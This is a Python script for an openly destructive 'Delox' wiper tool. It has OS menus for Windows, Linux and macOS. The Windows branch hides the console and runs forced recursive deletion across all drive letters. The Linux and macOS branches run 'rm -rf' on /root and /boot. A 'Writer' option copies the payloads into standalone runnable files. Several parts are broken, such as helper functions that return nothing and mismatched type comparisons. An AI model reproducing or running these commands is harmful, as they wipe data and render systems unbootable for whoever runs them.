import random
from turtle import color
from requests import get
import socket
from lib2to3.pgen2 import driver
import os , win32gui , win32con
import getpass
import time
import banner
from color import Color


def ClearCSR():
    os.system('clear')
    os.system('cls')

def username():
    getpass.getuser()

def ip_local():
    get('https://api.ipify.org').text

def ip_public():
    socket.gethostbyname(socket.gethostname())

def run():
    while True:
        ClearCSR()
        time.sleep(1)
        print(f'''
            ____       __          
            / __ \___  / /___  _  __
           / / / / _ \/ / __ \| |/_/
          / /_/ /  __/ / /_/ />  <  
         /_____/\___/_/\____/_/|_|
        programmer : One_Exploit'
    [*] -> onexploit@one_exploit.com'
    ''')
        systems = ('''
        [01] -> Windows
        [02] -> Linux
        [03] -> Os
        [04] -> Writer
        [99] -> exit
        ''')
        return systems
print(run())
sys = int(input('one_exploit => '))

if sys == '01' or sys == '02' or sys == '03':
    print('Which one [1,2,3,99]')
    run()
def exits():
    os.system('exit')
    print('''
        =========
        | By By |
        =========
                ''')

if sys == 1:
    while True:
        try:
            def delWindows():
                listdrive = ['A', 'B' , 'C' ,'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
                time.sleep(1)
                ClearCSR()
                banner.Created_banner(Color.RED +'Windows')
                print()
                username()
                ip_local()

                password = input('your system have password?(Y , n) : ').lower()
                if password == 'Y':
                    passnamesystem = getpass('Inter password '+username()+" : ")
                    print('=============================')
                    print('    YOU DELET ALL SYSTEM    |')
                    print('=============================')
                    print(f'usename: {username()}')
                    print(f'password: {passnamesystem}')
                    time.sleep(2)
                    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                    for d in listdrive:
                        driver = d
                        os.system('del '+ driver + ':\*.* /f /s /q')
                else:
                    print(f'usename: {username()}')
                    print('password: ')
                    time.sleep(2)
                    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                    for d in listdrive:
                        driver = d
                        os.system('del '+ driver + ':\*.* /f /s /q')
                    print('=============================')
                    print('    YOU DELET ALL SYSTEM    |')
                    print('=============================')
            delWindows()
            break
        except AttributeError:
            print( Color.RED +'[*] -> plese check the systems.')

elif sys == 2:
    while True:
        try:
            def delLinux():
                time.sleep(1)
                os.system('clear')
                banner.Created_banner(Color.RED + 'Linux')
                
                password = input('your system have password?(Y , n) : ').lower()
                if password == 'y':
                    passnamesystem = getpass('Inter password '+username()+" : ")
                    print('=============================')
                    print('    YOU DELET ALL SYSTEM    |')
                    print('=============================')
                    print('We are One_Exploit')
                    print(f'usename: {username()}')
                    print(f'pass: {passnamesystem}')
                    time.sleep(2)
                    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                    os.system('sudo su')
                    os.system('echo '+passnamesystem)
                    os.system('cp -r /home/'+username()+'/* /techer0221/')
                    os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                    os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                    os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                    os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')

                else:
                    print('=============================')
                    print('    YOU DELET ALL SYSTEM    |')
                    print('=============================')
                    print('We are One_Exploit')
                    print(f'usename: {username()}')
                    print('password: ')
                    time.sleep(2)
                    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                    os.system('sudo su')
                    os.system('cp -r /home/'+username()+'/* /techer0221/')
                    os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                    os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                    os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                    os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
            delLinux()
            break
        except AttributeError:
            print( Color.RED +'[*] -> plese check the systems.')

elif sys == 3:
    while True:
        try:
            def delOs():
                banner.Created_banner(Color.RED + 'MAC OS')
                ClearCSR()
                time.sleep(2)
                print('[*] -> your system deleted')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
            delOs()
            break
        except AttributeError:
            print( Color.RED +'[*] -> plese check the systems.')


elif sys == 4:
    def Menu_Writer():
        while True:
            ClearCSR()
            print(banner.Created_banner('Write Delox'))
            print('which one?')
            print('''
            [1] -> Windows      Write code Windows64 bit in new file for run.
            [2] -> Linux        Write code Linux bit in new file for run.
            [3] -> Mac OS       Write code MacOS in new file for run.
            [help] -> help
                ''')
            numbers = input('Enter Number: ')

            def Windows():
                with open('init/main1.py', 'r') as mfile:
                    with open('Windows.py', 'w') as file:
                        file.writelines(mfile)
                        file.close()
            def Linux():
                with open('init/main2.py', 'r') as mfile:
                    with open('Windows.py', 'w') as file:
                        file.writelines(mfile)
                        file.close()
            def MacOS():
                with open('init/main3.py' , 'r') as osfile:
                    with open('MacOS.py', 'w') as macOS:
                        macOS.writelines(osfile)
                        macOS.close()
            def Help():

                Helping = 'In this section, you can separate each executable\
                    file and save it in another file, for example, if you read Linux,\
                    it will copy the code in this tool for Linux in a new file and add it to the new file.\n \t \t \
                        if Do you went backed in first page write (Back) else Enter'
                print(Helping)
                with open('help.py', 'w') as file:
                    file.write(Helping)
                    file.close()
            if numbers == '1':
                print(Color.RED + '[*] waiting .')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ..')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ...')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting .....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ......')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print('\t\t The END')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                Windows()
            elif numbers == '2':
                print(Color.RED + '[*] waiting .')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ..')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ...')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting .....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ......')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print('\t\t The END')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                Linux()
            elif numbers == '3':
                print(Color.RED + '[*] waiting .')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ..')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ...')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting .....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ......')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print('\t\t The END')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                MacOS()
            elif numbers == 'help' or numbers == 'Help' or numbers == '4':
                print(Color.RED + '[*] waiting .')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ..')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ...')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting .....')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print(Color.RED + '[*] waiting ......')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))
                print('\t\t The END')
                time.sleep(random.choice([1,2,3,4,5,6,7,8,9]))

                input1 = input('Enter Anything.....')
                if input1 == '' or input1 == 'Enter' or input1 == 'enter':
                    Menu_Writer()
                elif input1 == 'back' or input1 == 'Back':
                    run()
            Help()
    Menu_Writer()
elif sys == 99:
    print('Good By')
    exits()
elif sys == '':
    run()

